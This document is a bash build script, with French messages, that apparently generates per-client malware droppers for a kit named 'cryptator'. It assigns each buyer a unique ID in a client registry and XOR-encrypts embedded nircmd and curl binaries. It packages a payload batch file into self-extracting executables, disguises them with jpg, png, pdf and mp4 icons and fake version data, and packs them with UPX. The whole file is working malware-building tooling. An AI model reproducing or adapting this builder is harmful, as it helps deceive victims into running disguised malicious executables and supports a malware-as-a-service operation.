#/bin/bash
#
WORKDIR=`dirname $0`
if [ "${WORKDIR}" == "." ]
then
  WORKDIR=`pwd`
fi

TEMPDIR=${WORKDIR}/temp
rm -rf ${TEMPDIR}
mkdir  ${TEMPDIR}

ZIP="${WORKDIR}/7z.exe"
GORC="${WORKDIR}/gorc.exe"
RESHACK="${WORKDIR}/ResHacker.exe"
UPX="${WORKDIR}/upx.exe"
UPX_EXT="-9 -f --brute -q"
#PAUSE="read"
PAUSE="true"

EXTENTIONS="exe pdf jpg png mp4"

echo "Nettoyage ..."
rm -f cryptator.7z jpg.7z png.7z pdf.7z mp4.7z

echo "Génaration d'un ID unique aléatoire "
UNIQUE=0
while [ ${UNIQUE} -eq 0 ]
do
  UNIQUEID=`echo $RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM | md5sum - | tr '[:lower:]' '[:upper:]' | cut -c1-8`
  grep "${UNIQUEID}" ${WORKDIR}/WWW/private/Clients.txt >/dev/null 2>&1
  UNIQUE=$?
done
echo " >>> Génération : ${UNIQUEID}"
OUTPUTDIR=${WORKDIR}/outfile/${UNIQUEID}
echo "${UNIQUEID}" > ${TEMPDIR}/client.id
echo "${UNIQUEID}:ChangeMyEmail@edgtslfcbngq6sk.space:Script kiddies" >> ${WORKDIR}/WWW/private/Clients.txt
echo

echo "Chiffrement des binaires embarqués"
cp ${WORKDIR}/xor/xor.exe      ${TEMPDIR}/${UNIQUEID}X.exe
cp ${WORKDIR}/xor/cygwin1.dll  ${TEMPDIR}/cygwin1.dll
${TEMPDIR}/${UNIQUEID}X.exe -k ${UNIQUEID} -s -i ${WORKDIR}/base/nircmdc.exe -o ${TEMPDIR}/${UNIQUEID}N.bin
${TEMPDIR}/${UNIQUEID}X.exe -k ${UNIQUEID} -s -i ${WORKDIR}/base/curl.exe    -o ${TEMPDIR}/${UNIQUEID}C.bin

echo "Préparation du répertoire de travail"
cp ${WORKDIR}/base/payload.bat ${TEMPDIR}/${UNIQUEID}P.bat
for i in CryptTables.dat image.jpg image.png document.pdf video.mp4
do
  cp ${WORKDIR}/base/$i ${TEMPDIR}/${i}
done
for i in ${EXTENTIONS}
do
  cp ${WORKDIR}/base/icon_${i}.rc        ${TEMPDIR}/
  cp ${WORKDIR}/base/icon_${i}.ico       ${TEMPDIR}/
  cp ${WORKDIR}/base/reshack_${i}.script ${TEMPDIR}/
done
cat ${WORKDIR}/base/config.txt | sed "s/payload.bat/${UNIQUEID}P.bat/"     > ${TEMPDIR}/config.txt
cat ${WORKDIR}/base/versionInfoTemplate.rc | sed "s/XXXXXXXX/${UNIQUEID}/" > ${TEMPDIR}/versionInfo.rc
unix2dos.exe ${TEMPDIR}/versionInfo.rc

${PAUSE}

echo "Creation des archives ..."
cd ${TEMPDIR}
${ZIP} a exe.7z ${UNIQUEID}P.bat *.bin client.id ${UNIQUEID}X.exe cygwin1.dll CryptTables.dat
${ZIP} a jpg.7z ${UNIQUEID}P.bat *.bin client.id ${UNIQUEID}X.exe cygwin1.dll image.jpg
${ZIP} a png.7z ${UNIQUEID}P.bat *.bin client.id ${UNIQUEID}X.exe cygwin1.dll image.png
${ZIP} a pdf.7z ${UNIQUEID}P.bat *.bin client.id ${UNIQUEID}X.exe cygwin1.dll document.pdf
${ZIP} a mp4.7z ${UNIQUEID}P.bat *.bin client.id ${UNIQUEID}X.exe cygwin1.dll video.mp4

echo "Creation des autoextractibles ..."
for i in ${EXTENTIONS}
do
  cat ../7zsd_all.sfx config.txt ${i}.7z > ${i}.exe
done

echo "Génération de la ressources de Version ..."
${GORC} versionInfo.rc

${PAUSE}

echo "Modification des EXE (icon et version) ..."
${RESHACK} -script reshack_exe.script
${RESHACK} -script reshack_jpg.script
${RESHACK} -script reshack_png.script
${RESHACK} -script reshack_mp4.script
${RESHACK} -script reshack_pdf.script

${PAUSE}

echo "Compression ..."
for i in ${EXTENTIONS}
do
  rm -f ${i}.exe
  mv ${i}.new.exe ${i}.exe
  ${UPX} ${UPX_EXT} ${i}.exe -o ${i}.upx.exe
done

${PAUSE}

echo "Déplacement dans le répertoire OUTFILE"
mkdir -p ${OUTPUTDIR}
for i in ${EXTENTIONS}
do
  mv ${i}.exe ${i}.upx.exe ${OUTPUTDIR}
done

${PAUSE}

echo "Nettoyage ..."
cd ${WORKDIR}/
rm -rf ${TEMPDIR}/
